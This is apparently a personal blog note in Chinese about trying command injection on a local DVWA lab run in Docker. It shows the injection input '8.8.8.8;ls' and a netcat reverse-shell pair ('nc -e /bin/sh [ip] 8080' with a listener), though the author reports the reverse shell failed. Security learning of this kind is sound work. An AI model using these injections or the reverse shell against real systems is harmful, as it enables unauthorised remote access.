---
title: Command Injection 小記
date: 2020-12-07 23:27:34
tags:
categories: Linux
---

command injection 

平常沒什麼看過
今天程式做弱點掃描發現這個問題
程式call web service 掃出弱點
等等web service 怎麼掃出 command injection ，改不會是誤判了
本片重點在 command injection

<!--more-->

- [Metasploitable 學習筆記-DVWA Command injection 命令注入攻擊與 Reverse Shell | by Kuro Huang | 資安工作者的學習之路 | Medium](https://medium.com/blacksecurity/metasploitable-dvwa-command-injection-9c092e180d0)

裡面談到 reverse shell 也滿有趣的，本篇用 dvwa 試跑一次

- [資安這條路 07 - [Injection] Command injection - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10242080)
- [那個夜裡的資安-22(Reverse Shell) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10221819)



## 安裝 dvwa

參考:
- [新手指南：DVWA-1.9全级别教程（完结篇，附实例）之XSS - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/123779.html)
- [新手指南：手把手教你如何搭建自己的渗透测试环境 - FreeBuf网络安全行业门户](https://www.freebuf.com/sectool/102661.html)

這邊使用 docker 安裝 dvwa

```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

用在那一台(docker)，使用 localhost 才連的到
使用`http://localhost/setup.php`

按下去`Create / Reset database` 按鈕，會自動跳回登入頁面

>    Username: admin
>    Password: password

## Command injection

進到左邊的`Command injection`
輸入欄位`8.8.8.8;ls`做查詢，這樣就能看到 ls 也能被執行


## reverse shell (失敗)

### docker 測試環境沒有 netcat

docker 安裝 

```bash
docker exec -it 63 bash
# 63 試 container ID
apt update
apt install -y netcat 
```

得知測試環境 docker ip

```
docker inspect 63 | grep IP 
```

```
            "LinkLocalIPv6Address": "",
            "LinkLocalIPv6PrefixLen": 0,
            "SecondaryIPAddresses": null,
            "SecondaryIPv6Addresses": null,
            "GlobalIPv6Address": "",
            "GlobalIPv6PrefixLen": 0,
            "IPAddress": "172.17.0.2",
            "IPPrefixLen": 16,
            "IPv6Gateway": "",
                    "IPAMConfig": null,
                    "IPAddress": "172.17.0.2",
                    "IPPrefixLen": 16,
                    "IPv6Gateway": "",
                    "GlobalIPv6Address": "",
                    "GlobalIPv6PrefixLen": 0,
```

這邊我們看到 docker IP 為 `172.17.0.2`
不過這邊需要讓 docker 連我的本機 IP ，如: `192.168.1.1`

- [socat 實用網路工具 和 使用解析 unix socket 方法 | 程式狂想筆記](https://malagege.github.io/blog/2020/02/14/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/)


nc 環境在docker 環境無法使用...
有空再研究，睡覺


    在Kali執行nc -vv -l -p 8080
    在網頁執行nc -e /bin/sh [ip] 8080
    執行指令

有空來測試[Vagrant box mmckinst/dvwa - Vagrant Cloud](https://app.vagrantup.com/mmckinst/boxes/dvwa)

## 
